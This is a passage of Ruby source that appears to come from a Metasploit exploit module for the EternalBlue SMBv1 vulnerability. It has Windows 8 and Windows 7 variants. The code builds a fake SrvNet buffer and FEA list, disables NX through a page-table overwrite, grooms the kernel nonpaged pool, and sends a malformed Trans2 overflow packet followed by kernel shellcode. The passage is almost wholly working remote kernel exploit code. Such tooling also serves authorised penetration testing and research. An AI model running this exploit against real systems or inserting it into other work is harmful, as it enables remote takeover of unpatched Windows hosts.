# execute shellcode, at this point the shellcode should be located at ffffffff`ffd04180\n    srvnet_conn.each(&:close)\n\n    nx_tree.disconnect!\n    nx_conn.disconnect!\n\n    tree.disconnect!\n    conn.disconnect!\n  end\n\n  def create_fea_list(sc_size)\n    fea_list = [0x10000].pack('I<')\n    fea_list += NTFEA_9000\n    fake_srv_net_buf = create_fake_srv_net_buffer(sc_size)\n    fea_list += [0, 0, fake_srv_net_buf.length - 1].pack('CCS<') + fake_srv_net_buf # -1 because first '\\x00' is for name\n    # stop copying by invalid flag (can be any value except 0 and 0x80)\n    fea_list += [0x12, 0x34, 0x5678].pack('CCS<')\n    return fea_list\n  end\n\n  def create_fake_srv_net_buffer(sc_size)\n    # 0x180 is size of fakeSrvNetBufferX64\n    total_recv_size = 0x80 + 0x180 + sc_size\n    fake_srv_net_buffer_x64 = \"\\x00\" * 16\n    fake_srv_net_buffer_x64 += [0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR].pack('SSIQ<') # flag, _, _, pNetRawBuffer\n    fake_srv_net_buffer_x64 += [0, 0x82e8, 0].pack('QII<') # _, thisNonPagedPoolSize, _\n    fake_srv_net_buffer_x64 += \"\\x00\" * 16\n    fake_srv_net_buffer_x64 += [0, total_recv_size].pack('QQ<') # offset 0x40\n    fake_srv_net_buffer_x64 += [TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR].pack('Q<Q<') # pmdl2, pointer to fake struct\n    fake_srv_net_buffer_x64 += [0, 0].pack('QQ<')\n    fake_srv_net_buffer_x64 += \"\\x00\" * 16\n    fake_srv_net_buffer_x64 += \"\\x00\" * 16\n    fake_srv_net_buffer_x64 += [0, 0x60, 0x1004, 0].pack('QSSI<') # MDL.Next, MDL.Size, MDL.MdlFlags\n    fake_srv_net_buffer_x64 += [0, TARGET_HAL_HEAP_ADDR - 0x80].pack('QQ<') # MDL.Process, MDL.MappedSystemVa\n\n    return fake_srv_net_buffer_x64\n  end\n\n  def exploit_eb\n    num_groom_conn = datastore['GroomAllocations'].to_i\n    smbuser = datastore['SMBUser'].present? ? datastore['SMBUser'] : ''\n    smbpass = datastore['SMBPass'].present? ? datastore['SMBPass'] : ''\n\n    sc = make_kernel_user_payload(payload.encoded, datastore['ProcessName'])\n\n    if sc.length > MAX_SHELLCODE_SIZE\n      print_error(\"Shellcode too long. The place that this exploit put a shellcode is limited to #{MAX_SHELLCODE_SIZE} bytes.\")\n      return\n    end\n\n    fea_list = create_fea_list(sc.length)\n\n    print_status(\"shellcode size: #{sc.length}\")\n    print_status(\"numGroomConn: #{num_groom_conn}\")\n\n    begin\n      _exploit(fea_list, sc, num_groom_conn, smbuser, smbpass)\n    rescue StandardError => e\n      print_error(\"Exploit failed with the following error: #{e.message}\")\n      elog('Error encountered with eternalblue_win8', error: e)\n      return false\n    end\n  end\n\n  def create_session_alloc_non_paged(size, username, password, pid)\n    # if not use unicode, buffer size on target machine is doubled because converting ascii to utf16\n    sess_pkt = SessionSetupSMB1RequestWithPoorlyFormedDataBlock.new\n\n    anon_conn, _anon_tree, anon_sock = smb1_connect_ipc(negotiate_only: true)\n\n    sess_pkt.smb_header.pid_low = pid\n\n    if size >= 65535 # 0xffff\n      sess_pkt.data_block.security_blob = [(size / 2).floor].pack('S<') + \"\\x00\" * 20\n      sess_pkt.smb_header.flags2.unicode = 0\n    else\n      sess_pkt.data_block.security_blob = [size].pack('S<') + \"\\x00\" * 20\n      sess_pkt.smb_header.flags2.unicode = 1\n    end\n\n    sess_pkt.smb_header.flags2.extended_security = 0\n    sess_pkt.smb_header.flags2.nt_status = 1\n    sess_pkt.smb_header.flags2.paging_io = 0\n\n    sess_pkt.parameter_block.max_buffer_size = 61440 # can be any value greater than response size\n    sess_pkt.parameter_block.max_mpx_count = 2 # can by any value\n    sess_pkt.parameter_block.vc_number = 2 # any non-zero\n    sess_pkt.parameter_block.session_key = 0\n    sess_pkt.parameter_block.security_blob_length = 0 # this is OEMPasswordLen field in another format. 0 for NULL session\n\n    sess_pkt.parameter_block.capabilities.each_pair do |k|\n      if k == :nt_status || k == :extended_security\n        sess_pkt.parameter_block.capabilities[k] = 1\n      else\n        sess_pkt.parameter_block.capabilities[k] = 0\n      end\n    end\n\n    recv_pkt = RubySMB::SMB1::Packet::SessionSetupResponse.read(anon_conn.send_recv(sess_pkt))\n\n    if recv_pkt.status_code.value == 0\n      print_good('SMB1 session setup allocate nonpaged pool success')\n      return anon_conn, anon_sock\n    end\n\n    anon_conn.disconnect!\n\n    unless username.empty?\n      # Try login with valid user because anonymous user might get access denied on Windows Server 2012\n      # Note: If target allows only NTLMv2 authentication, the login will always fail.\n      # support only ascii because I am lazy to implement Unicode (need pad for alignment and converting username to utf-16)\n      req_size = (size / 2).floor\n\n      neg_pkt = RubySMB::SMB1::Packet::NegotiateRequest.new\n      neg_pkt.smb_header.flags2.extended_security = 0\n      neg_pkt.add_dialect('NT LM 0.12')\n\n      client, sock = custom_smb_client\n\n      raw_response = client.send_recv(neg_pkt)\n      response_packet = client.negotiate_response(raw_response)\n\n      # parse_negotiate_response\n      client.smb1 = true\n      client.smb2 = false\n      client.smb3 = false\n      client.signing_required = response_packet.parameter_block.security_mode.security_signatures_required == 1\n      client.dialect = response_packet.negotiated_dialect.to_s\n      client.server_max_buffer_size = response_packet.parameter_block.max_buffer_size - 260\n      client.negotiated_smb_version = 1\n      client.session_encrypt_data = false\n      client.server_guid = response_packet.data_block[:server_guid]\n\n      server_challenge = response_packet.data_block.challenge\n\n      sess_pkt.smb_header.pid_low = pid\n      sess_pkt.smb_header.flags2.unicode = 0\n\n      pwd_unicode = NTLM_CRYPT.ntlm_md4(password, server_challenge)\n\n      sess_pkt.parameter_block.reserved = pwd_unicode.length\n      sess_pkt.data_block.security_blob = [req_size + pwd_unicode.length + username.length].pack('S<') + pwd_unicode + username + (\"\\x00\" * 16)\n\n      recv_pkt = RubySMB::SMB1::Packet::SessionSetupResponse.read(client.send_recv(sess_pkt))\n\n      if recv_pkt.status_code.value == 0\n        print_good('SMB1 session setup allocate nonpaged pool success')\n        return client, sock\n      end\n      client.disconnect!\n    end\n\n    print_error(\"SMB1 session setup allocate nonpaged pool failed: #{recv_pkt.status_code.name}\\n#{recv_pkt.status_code.description}\")\n    return nil\n  end\n\n  def generate_fea_list_nx\n    # fea_list for disabling NX is possible because we just want to change only MDL.MappedSystemVa\n    # PTE of 0xffffffffffd00000 is at 0xfffff6ffffffe800\n    # NX bit is at PTE_ADDR+7\n    # MappedSystemVa = PTE_ADDR+7 - 0x7f\n    shellcode_page_addr = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000\n    pte_addr = 0xfffff6ffffffe800 + 8 * ((shellcode_page_addr - 0xffffffffffd00000) >> 12)\n    fake_srv_net_buffer_x64nx = \"\\x00\" * 16\n    fake_srv_net_buffer_x64nx += [0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR].pack('SSIQ<')\n    fake_srv_net_buffer_x64nx += \"\\x00\" * 16\n    fake_srv_net_buffer_x64nx += \"\\x00\" * 16\n    fake_srv_net_buffer_x64nx += [0, 0].pack('QQ<')\n    fake_srv_net_buffer_x64nx += [0, TARGET_HAL_HEAP_ADDR].pack('QQ<') # _, _, pointer to fake struct\n    fake_srv_net_buffer_x64nx += [0, 0,].pack('QQ<')\n    fake_srv_net_buffer_x64nx += \"\\x00\" * 16\n    fake_srv_net_buffer_x64nx += \"\\x00\" * 16\n    fake_srv_net_buffer_x64nx += [0, 0x60, 0x1004, 0].pack('QSSI<') # MDL.Next, MDL.Size, MDL.MdlFlags\n    fake_srv_net_buffer_x64nx += [0, pte_addr + 7 - 0x7f].pack('QQ<') # MDL.Process, MDL.MappedSystemVa\n\n    fea_list_nx = [0x10000].pack('I<')\n    fea_list_nx += NTFEA_9000\n    fea_list_nx += [0, 0, fake_srv_net_buffer_x64nx.length - 1].pack('CCS<') + fake_srv_net_buffer_x64nx # -1 because first '\\x00' is for name\n    # stop copying by invalid flag (can be any value except 0 and 0x80)\n    fea_list_nx += [0x12, 0x34, 0x5678].pack('CCS<')\n\n    fea_list_nx\n  end\n\n  def default_session_setup_request\n    p = RubySMB::SMB1::Packet::SessionSetupRequest.new\n    p.parameter_block.max_buffer_size = 61440\n    p.parameter_block.max_mpx_count = 50\n    p.smb_header.flags2.extended_security = 1\n\n    p\n  end\n\n  # Returns the value to be passed to SMB clients for\n  # the password. If the user has not supplied a password\n  # it returns an empty string to trigger an anonymous\n  # logon.\n  #\n  # @return [String] the password value\n  def smb_pass\n    if datastore['SMBPass'].present?\n      datastore['SMBPass']\n    else\n      ''\n    end\n  end\n\n  # Returns the value to be passed to SMB clients for\n  # the username. If the user has not supplied a username\n  # it returns an empty string to trigger an anonymous\n  # logon.\n  #\n  # @return [String] the username value\n  def smb_user\n    if datastore['SMBUser'].present?\n      datastore['SMBUser']\n    else\n      ''\n    end\n  end\n\n  # Returns the value to be passed to SMB clients for\n  # the domain. If the user has not supplied a domain\n  # it returns an empty string to trigger an anonymous\n  # logon.\n  #\n  # @return [String] the domain value\n  def smb_domain\n    if datastore['SMBDomain'].present?\n      datastore['SMBDomain']\n    else\n      ''\n    end\n  end\n\n  class SessionSetupSMB1RequestWithPoorlyFormedDataBlock < RubySMB::GenericPacket\n    COMMAND = RubySMB::SMB1::Commands::SMB_COM_SESSION_SETUP_ANDX\n\n    class ParameterBlock < RubySMB::SMB1::Packet::SessionSetupRequest::ParameterBlock\n    end\n\n    class DataBlock < RubySMB::SMB1::DataBlock\n      # Key difference for this class is that the length of security_blob is NOT dictated by the value of\n      # security_blob_length in the +SessionSetupRequest::ParameterBlock+\n      string :security_blob, label: 'Security Blob (GSS-API)'\n      string :native_os, label: 'Native OS'\n      string :native_lan_man, label: 'Native LAN Manager'\n    end\n\n    smb_header :smb_header\n    parameter_block :parameter_block\n    data_block :data_block\n  end\n\n  class CustomSessionSetupPacketRubySMBClient < ::RubySMB::Client\n    def send_recv(packet, encrypt: false)\n      version = packet.packet_smb_version\n      case version\n      when 'SMB1'\n        packet.smb_header.uid = user_id if user_id\n        packet.smb_header.pid_low = pid if pid && packet.smb_header.pid_low == 0\n        packet = smb1_sign(packet)\n      when 'SMB2'\n        packet = increment_smb_message_id(packet)\n        packet.smb2_header.session_id = session_id\n        unless packet.is_a?(RubySMB::SMB2::Packet::SessionSetupRequest)\n          if smb2\n            packet = smb2_sign(packet)\n          elsif smb3\n            packet = smb3_sign(packet)\n          end\n        end\n      end\n\n      encrypt_data = false\n      if can_be_encrypted?(packet) && encryption_supported? && (@session_encrypt_data || encrypt)\n        encrypt_data = true\n      end\n      send_packet(packet, encrypt: encrypt_data)\n      raw_response = recv_packet(encrypt: encrypt_data)\n      smb2_header = nil\n      unless version == 'SMB1'\n        loop do\n          smb2_header = RubySMB::SMB2::SMB2Header.read(raw_response)\n          break unless is_status_pending?(smb2_header)\n\n          sleep 1\n          raw_response = recv_packet(encrypt: encrypt_data)\n        rescue IOError\n          # We're expecting an SMB2 packet, but the server sent an SMB1 packet\n          # instead. This behavior has been observed with older versions of Samba\n          # when something goes wrong on the server side. So, we just ignore it\n          # and expect the caller to handle this wrong response packet.\n          break\n        end\n      end\n\n      self.sequence_counter += 1 if signing_required && !session_key.empty?\n      # update the SMB2 message ID according to the received Credit Charged\n      self.smb2_message_id += smb2_header.credit_charge - 1 if smb2_header && server_supports_multi_credit\n      raw_response\n    end\n\n    def login(username: self.username, password: self.password,\n              domain: self.domain, local_workstation: self.local_workstation,\n              ntlm_flags: default_flags,\n              session_setup_packet: nil,\n              session_setup_auth_packet: nil)\n\n      negotiate\n      session_setup(username, password, domain,\n                    local_workstation: local_workstation,\n                    ntlm_flags: ntlm_flags,\n                    session_setup_packet: session_setup_packet,\n                    session_setup_auth_packet: session_setup_auth_packet)\n    end\n\n    def session_setup(user, pass, domain,\n                      local_workstation: self.local_workstation, ntlm_flags: default_flags,\n                      session_setup_packet: nil, session_setup_auth_packet: nil)\n      @domain = domain\n      @local_workstation = local_workstation\n      @password = pass.encode('utf-8') || ''.encode('utf-8')\n      @username = user.encode('utf-8') || ''.encode('utf-8')\n\n      @ntlm_client = Net::NTLM::Client.new(\n        @username,\n        @password,\n        workstation: @local_workstation,\n        domain: @domain,\n        flags: ntlm_flags\n      )\n\n      authenticate(smb1_setup_pkt: session_setup_packet, smb1_setup_auth_pkt: session_setup_auth_packet)\n    end\n\n    def authenticate(smb1_setup_pkt: nil, smb1_setup_auth_pkt: nil)\n      if smb1\n        if username.empty? && password.empty?\n          smb1_authenticate(session_setup_packet: smb1_setup_pkt,\n                            session_setup_auth_packet: smb1_setup_auth_pkt,\n                            anonymous: true)\n        else\n          smb1_authenticate(session_setup_packet: smb1_setup_pkt,\n                            session_setup_auth_packet: smb1_setup_auth_pkt)\n        end\n      else\n        smb2_authenticate\n      end\n    end\n\n    def smb1_authenticate(session_setup_packet: nil, session_setup_auth_packet: nil, anonymous: false)\n      response = smb1_ntlmssp_negotiate(session_setup_packet: session_setup_packet)\n      challenge_packet = smb1_ntlmssp_challenge_packet(response)\n\n      # Store the available OS information before going forward.\n      @peer_native_os = challenge_packet.data_block.native_os.to_s\n      @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s\n      user_id = challenge_packet.smb_header.uid\n      type2_b64_message = smb1_type2_message(challenge_packet)\n      type3_message = @ntlm_client.init_context(type2_b64_message)\n\n      if anonymous\n        type3_message.ntlm_response = ''\n        type3_message.lm_response = ''\n      end\n\n      @session_key = @ntlm_client.session_key\n      challenge_message = @ntlm_client.session.challenge_message\n      store_target_info(challenge_message.target_info) if challenge_message.has_flag?(:TARGET_INFO)\n      @os_version = extract_os_version(challenge_message.os_version.to_s) unless challenge_message.os_version.empty?\n\n      raw = smb1_ntlmssp_authenticate(type3_message, user_id, session_setup_packet: session_setup_auth_packet)\n      response = smb1_ntlmssp_final_packet(raw)\n      response_code = response.status_code\n\n      @user_id = user_id if response_code == ::WindowsError::NTStatus::STATUS_SUCCESS\n      response_code\n    end\n\n    def smb1_ntlmssp_negotiate(session_setup_packet: nil)\n      packet = smb1_ntlmssp_negotiate_packet(session_setup_packet: session_setup_packet)\n      send_recv(packet)\n    end\n\n    def smb1_ntlmssp_authenticate(type3_message, user_id, session_setup_packet: nil)\n      packet = smb1_ntlmssp_auth_packet(type3_message, user_id, session_setup_packet: session_setup_packet)\n      send_recv(packet)\n    end\n\n    def smb1_ntlmssp_auth_packet(type3_message, user_id, session_setup_packet: nil)\n      if session_setup_packet.nil?\n        packet = RubySMB::SMB1::Packet::SessionSetupRequest.new\n        packet.smb_header.uid = user_id\n        packet.set_type3_blob(type3_message.serialize)\n        packet.parameter_block.max_mpx_count = 50\n        packet.smb_header.flags2.extended_security = 1\n\n        packet\n      else\n        if session_setup_packet.data_block.security_blob.empty?\n          session_setup_packet.set_type3_blob(type3_message.serialize)\n        end\n        if session_setup_packet.smb_header.uid == 0\n          session_setup_packet.smb_header.uid = user_id\n        end\n        if session_setup_packet.parameter_block.max_buffer_size == 0\n          session_setup_packet.parameter_block.max_buffer_size = max_buffer_size\n        end\n        if session_setup_packet.smb_header.pid_low == 0\n          session_setup_packet.smb_header.pid_low = pid\n        end\n\n        session_setup_packet\n      end\n    end\n\n    def smb1_ntlmssp_negotiate_packet(session_setup_packet: nil)\n      type1_message = ntlm_client.init_context\n\n      if session_setup_packet.nil?\n        packet = RubySMB::SMB1::Packet::SessionSetupRequest.new unless session_setup_packet\n        packet.set_type1_blob(type1_message.serialize)\n        packet.parameter_block.max_mpx_count = 50\n        packet.smb_header.flags2.extended_security = 1\n\n        packet\n      else\n        if session_setup_packet.data_block.security_blob.empty?\n          session_setup_packet.set_type1_blob(type1_message.serialize)\n        end\n\n        session_setup_packet\n      end\n    end\n  end\nend\n\nmodule EternalBlueWin7\n  require 'ruby_smb'\n  require 'ruby_smb/smb1/packet'\n  require 'windows_error'\n\n  include Msf::Exploit::Remote::DCERPC\n\n  class EternalBlueError < StandardError\n  end\n\n  def exploit_eb\n    begin\n      for i in 1..datastore['MaxExploitAttempts']\n        grooms = datastore['GroomAllocations'] + datastore['GroomDelta'] * (i - 1)\n        smb_eternalblue(datastore['ProcessName'], grooms)\n\n        # we don't need this sleep, and need to find a way to remove it\n        # problem is session_count won't increment until stage is complete :\\\n        secs = 0\n        while !session_created? && (secs < 30)\n          secs += 1\n          sleep 1\n        end\n\n        if session_created?\n          print_good('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')\n          print_good('=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')\n          print_good('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')\n          break\n        else\n          print_bad('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')\n          print_bad('=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')\n          print_bad('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')\n        end\n      end\n    rescue EternalBlueError => e\n      print_error(e.message.to_s)\n      return false\n    rescue ::RubySMB::Error::NegotiationFailure\n      print_error('SMB Negotiation Failure -- this often occurs when lsass crashes.  The target may reboot in 60 seconds.')\n      return false\n    rescue ::RubySMB::Error::UnexpectedStatusCode,\n           ::Errno::ECONNRESET,\n           ::Rex::HostUnreachable,\n           ::Rex::ConnectionTimeout,\n           ::Rex::ConnectionRefused,\n           ::RubySMB::Error::CommunicationError => e\n      print_error(\"#{e.class}: #{e.message}\")\n      report_failure\n      return false\n    rescue StandardError => e\n      print_error(e.class.to_s)\n      print_error(e.message)\n      print_error(e.backtrace.join(\"\\n\"))\n      return false\n    end\n  end\n\n  def smb_eternalblue(process_name, grooms)\n    begin\n      # Step 0: pre-calculate what we can\n      shellcode = make_kernel_user_payload(payload.encoded, process_name)\n      payload_hdr_pkt = make_smb2_payload_headers_packet\n      payload_body_pkt = make_smb2_payload_body_packet(shellcode)\n\n      # Step 1: Connect to IPC$ share\n      print_status('Connecting to target for exploitation.')\n      client, tree, sock, os = smb1_anonymous_connect_ipc\n    rescue RubySMB::Error::CommunicationError\n      # Error handler in case SMBv1 disabled on target\n      raise EternalBlueError, 'Could not make SMBv1 connection'\n    else\n      print_good('Connection established for exploitation.')\n\n      if verify_target(os)\n        print_good('Target OS selected valid for OS indicated by SMB reply')\n      else\n        print_warning('Target OS selected not valid for OS indicated by SMB reply')\n        print_warning('Disable VerifyTarget option to proceed manually...')\n        raise EternalBlueError, 'Unable to continue with improper OS Target.'\n      end\n\n      # cool buffer print no matter what, will be helpful when people post debug issues\n      print_core_buffer(os)\n\n      if verify_arch\n        print_good('Target arch selected valid for arch indicated by DCE/RPC reply')\n      else\n        print_warning('Target arch selected not valid for arch indicated by DCE/RPC reply')\n        print_warning('Disable VerifyArch option to proceed manually...')\n        raise EternalBlueError, 'Unable to continue with improper OS Arch.'\n      end\n\n      print_status(\"Trying exploit with #{grooms} Groom Allocations.\")\n\n      # Step 2: Create a large SMB1 buffer\n      print_status('Sending all but last fragment of exploit packet')\n      smb1_large_buffer(client, tree, sock)\n\n      # Step 3: Groom the pool with payload packets, and open/close SMB1 packets\n      print_status('Starting non-paged pool grooming')\n\n      # initialize_groom_threads(ip, port, payload, grooms)\n      fhs_sock = smb1_free_hole(true)\n\n      @groom_socks = []\n\n      print_good('Sending SMBv2 buffers')\n      smb2_grooms(grooms, payload_hdr_pkt)\n\n      fhf_sock = smb1_free_hole(false)\n\n      print_good('Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.')\n      fhs_sock.shutdown\n\n      print_status('Sending final SMBv2 buffers.') # 6x\n      smb2_grooms(6, payload_hdr_pkt) # TODO: magic #\n\n      fhf_sock.shutdown\n\n      print_status('Sending last fragment of exploit packet!')\n      final_exploit_pkt = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_exploit, 15)\n      sock.put(final_exploit_pkt)\n\n      print_status('Receiving response from exploit packet')\n      code, _raw = smb1_get_response(sock)\n\n      code_str = '0x' + code.to_i.to_s(16).upcase\n      if code.nil?\n        print_error('Did not receive a response from exploit packet')\n      elsif code == 0xc000000d # STATUS_INVALID_PARAMETER (0xC000000D)\n        print_good(\"ETERNALBLUE overwrite completed successfully (#{code_str})!\")\n      else\n        print_warning(\"ETERNALBLUE overwrite returned unexpected status code (#{code_str})!\")\n      end\n\n      # Step 4: Send the payload\n      print_status('Sending egg to corrupted connection.')\n\n      @groom_socks.each { |gsock| gsock.put(payload_body_pkt.first(2920)) }\n      @groom_socks.each { |gsock| gsock.put(payload_body_pkt[2920..(4204 - 0x84)]) }\n\n      print_status('Triggering free of corrupted buffer.')\n      # tree disconnect\n      # logoff and x\n      # note: these aren't necessary, just close the sockets\n      return true\n    ensure\n      abort_sockets\n    end\n  end\n\n  def verify_target(os)\n    os = os.gsub(\"\\x00\", '') # strip unicode bs\n    os << \"\\x00\" # but original has a null\n    ret = true\n\n    if datastore['VerifyTarget']\n      ret = false\n      # search if its in patterns\n      target['os_patterns'].each do |pattern|\n        if os.downcase.include? pattern.downcase\n          ret = true\n          break\n        end\n      end\n    end\n\n    return ret\n  end\n\n  def verify_arch\n    return true unless datastore['VerifyArch']\n\n    # XXX: This sends a new DCE/RPC packet\n    arch = dcerpc_getarch\n\n    return true if arch && arch == target_arch.first\n\n    print_warning(\"Target arch is #{target_arch.first}, but server returned #{arch.inspect}\")\n    print_warning('The DCE/RPC service or probe may be blocked') if arch.nil?\n    false\n  end\n\n  def print_core_buffer(os)\n    print_status(\"CORE raw buffer dump (#{os.length} bytes)\")\n\n    count = 0\n    chunks = os.scan(/.{1,16}/)\n    chunks.each do |chunk|\n      hexdump = chunk.chars.map { |ch| ch.ord.to_s(16).rjust(2, '0') }.join(' ')\n\n      format = format('0x%08x  %-47s  %-16s', (count * 16), hexdump, chunk)\n      print_status(format)\n      count += 1\n    end\n  end\n\n  def smb2_grooms(grooms, payload_hdr_pkt)\n    grooms.times do |_groom_id|\n      gsock = connect(false)\n      @groom_socks << gsock\n      gsock.put(payload_hdr_pkt)\n    end\n  end\n\n  def smb1_anonymous_connect_ipc\n    sock = connect(false)\n    dispatcher = RubySMB::Dispatcher::Socket.new(sock)\n    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, smb3: false, username: smb_user, domain: smb_domain, password: smb_pass)\n    client.pid = nil\n    response_code = client.login\n\n    unless response_code == ::WindowsError::NTStatus::STATUS_SUCCESS\n      raise RubySMB::Error::UnexpectedStatusCode, \"Error with login: #{response_code}\"\n    end\n\n    os = client.peer_native_os\n\n    tree = client.tree_connect(\"\\\\\\\\#{datastore['RHOST']}\\\\IPC$\")\n\n    return client, tree, sock, os\n  end\n\n  def smb1_large_buffer(client, tree, sock)\n    nt_trans_pkt = make_smb1_nt_trans_packet(tree.id, client.user_id)\n\n    # send NT Trans\n    vprint_status('Sending NT Trans Request packet')\n\n    client.send_recv(nt_trans_pkt)\n    # Initial Trans2  request\n    trans2_pkt_nulled = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_zero, 0)\n\n    # send all but last packet\n    for i in 1..14\n      trans2_pkt_nulled << make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_buffer, i)\n    end\n\n    vprint_status('Sending malformed Trans2 packets')\n    sock.put(trans2_pkt_nulled)\n\n    begin\n      sock.get_once\n    rescue EOFError\n      vprint_error('No response back from SMB echo request.  Continuing anyway...')\n    end\n\n    client.echo(count: 1, data: \"\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x00\")\n  end\n\n  def smb1_free_hole(start)\n    sock = connect(false)\n    dispatcher = RubySMB::Dispatcher::Socket.new(sock)\n    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, smb3: false, username: smb_user, domain: smb_domain, password: smb_pass)\n    client.pid = nil\n    client.negotiate\n\n    pkt = ''\n\n    if start\n      vprint_status('Sending start free hole packet.')\n      pkt = make_smb1_free_hole_session_packet(\"\\x07\\xc0\", \"\\x2d\\x01\", \"\\xf0\\xff\\x00\\x00\\x00\")\n    else\n      vprint_status('Sending end free hole packet.')\n      pkt = make_smb1_free_hole_session_packet(\"\\x07\\x40\", \"\\x2c\\x01\", \"\\xf8\\x87\\x00\\x00\\x00\")\n    end\n\n    client.send_recv(pkt)\n    sock\n  end\n\n  def smb1_get_response(sock)\n    raw = nil\n\n    # dirty hack since it doesn't always like to reply the first time...\n    16.times do\n      raw = sock.get_once\n      break unless raw.nil? || raw.empty?\n    end\n\n    return nil unless raw\n\n    response = RubySMB::SMB1::SMBHeader.read(raw[4..-1])\n    code = response.nt_status\n    return code, raw, response\n  end\n\n  def make_smb2_payload_headers_packet\n    # don't need a library here, the packet is essentially nonsensical\n    pkt = ''\n    pkt << \"\\x00\" # session message\n    pkt << \"\\x00\\xff\\xf7\" # size\n    pkt << \"\\xfeSMB\" # SMB2\n    pkt << \"\\x00\" * 124\n\n    pkt\n  end\n\n  def make_smb2_payload_body_packet(kernel_user_payload)\n    # precalculated lengths\n    pkt_max_len = 4204\n    pkt_setup_len = 497\n    pkt_max_payload = pkt_max_len - pkt_setup_len # 3575\n\n    # this packet holds padding, KI_USER_SHARED_DATA addresses, and shellcode\n    pkt = ''\n\n    # padding\n    pkt << \"\\x00\" * 0x8\n    pkt << \"\\x03\\x00\\x00\\x00\"\n    pkt << \"\\x00\" * 0x1c\n    pkt << \"\\x03\\x00\\x00\\x00\"\n    pkt << \"\\x00\" * 0x74\n\n    # KI_USER_SHARED_DATA addresses\n    pkt << \"\\xb0\\x00\\xd0\\xff\\xff\\xff\\xff\\xff\" * 2 # x64 address\n    pkt << \"\\x00\" * 0x10\n    pkt << \"\\xc0\\xf0\\xdf\\xff\" * 2 # x86 address\n    pkt << \"\\x00\" * 0xc4\n\n    # payload addreses\n    pkt << \"\\x90\\xf1\\xdf\\xff\"\n    pkt << \"\\x00\" * 0x4\n    pkt << \"\\xf0\\xf1\\xdf\\xff\"\n    pkt << \"\\x00\" * 0x40\n\n    pkt << \"\\xf0\\x01\\xd0\\xff\\xff\\xff\\xff\\xff\"\n    pkt << \"\\x00\" * 0x8\n    pkt << \"\\x00\\x02\\xd0\\xff\\xff\\xff\\xff\\xff\"\n    pkt << \"\\x00\"\n\n    pkt << kernel_user_payload\n\n    # fill out the rest, this can be randomly generated\n    pkt << \"\\x00\" * (pkt_max_payload - kernel_user_payload.length)\n\n    pkt\n  end\n\n  # Type can be :eb_trans2_zero, :eb_trans2_buffer, or :eb_trans2_exploit\n  def make_smb1_trans2_exploit_packet(tree_id, user_id, type, timeout)\n    timeout = (timeout * 0x10) + 3\n    timeout_value = \"\\x35\\x00\\xd0\" + timeout.chr\n\n    packet = RubySMB::SMB1::Packet::Trans2::Request.new\n    packet = set_smb1_headers(packet, tree_id, user_id)\n\n    # The packets are labeled as Secondary Requests but are actually structured\n    # as normal Trans2 Requests for some reason. We shall similarly cheat here.\n    packet.smb_header.command = RubySMB::SMB1::Commands::SMB_COM_TRANSACTION2_SECONDARY\n\n    packet.parameter_block.flags.read(\"\\x00\\x10\")\n    packet.parameter_block.timeout.read(timeout_value)\n\n    packet.parameter_block.word_count = 9\n    packet.parameter_block.total_data_count = 4096\n    packet.parameter_block.parameter_count = 4096\n\n    nbss = \"\\x00\\x00\\x10\\x35\"\n    pkt = packet.to_binary_s\n    pkt = pkt[0, packet.parameter_block.parameter_offset.abs_offset]\n    pkt = nbss + pkt\n\n    case type\n    when :eb_trans2_exploit\n      vprint_status('Making :eb_trans2_exploit packet')\n\n      pkt << \"\\x41\" * 2957\n\n      pkt << \"\\x80\\x00\\xa8\\x00\" # overflow\n\n      pkt << \"\\x00\" * 0x10\n      pkt << \"\\xff\\xff\"\n      pkt << \"\\x00\" * 0x6\n      pkt << \"\\xff\\xff\"\n      pkt << \"\\x00\" * 0x16\n\n      pkt << \"\\x00\\xf1\\xdf\\xff\" # x86 addresses\n      pkt << \"\\x00\" * 0x8\n      pkt << \"\\x20\\xf0\\xdf\\xff\"\n\n      pkt << \"\\x00\\xf1\\xdf\\xff\\xff\\xff\\xff\\xff\" # x64\n\n      pkt << \"\\x60\\x00\\x04\\x10\"\n      pkt << \"\\x00\" * 4\n\n      pkt << \"\\x80\\xef\\xdf\\xff\"\n\n      pkt << \"\\x00\" * 4\n      pkt << \"\\x10\\x00\\xd0\\xff\\xff\\xff\\xff\\xff\"\n      pkt << \"\\x18\\x01\\xd0\\xff\\xff\\xff\\xff\\xff\"\n      pkt << \"\\x00\" * 0x10\n\n      pkt << \"\\x60\\x00\\x04\\x10\"\n      pkt << \"\\x00\" * 0xc\n      pkt << \"\\x90\\xff\\xcf\\xff\\xff\\xff\\xff\\xff\"\n      pkt << \"\\x00\" * 0x8\n      pkt << \"\\x80\\x10\"\n      pkt << \"\\x00\" * 0xe\n      pkt << \"\\x39\"\n      pkt << \"\\xbb\"\n\n      pkt << \"\\x41\" * 965\n    when :eb_trans2_zero\n      vprint_status('Making :eb_trans2_zero packet')\n      pkt << \"\\x00\" * 2055\n      pkt << \"\\x83\\xf3\"\n      pkt << \"\\x41\" * 2039\n    else\n      vprint_status('Making :eb_trans2_buffer packet')\n      pkt << \"\\x41\" * 4096\n    end\n    pkt\n  end\n\n  def make_smb1_nt_trans_packet(tree_id, user_id)\n    packet = RubySMB::SMB1::Packet::NtTrans::Request.new\n\n    # Disable the automatic padding because it will distort\n    # our values 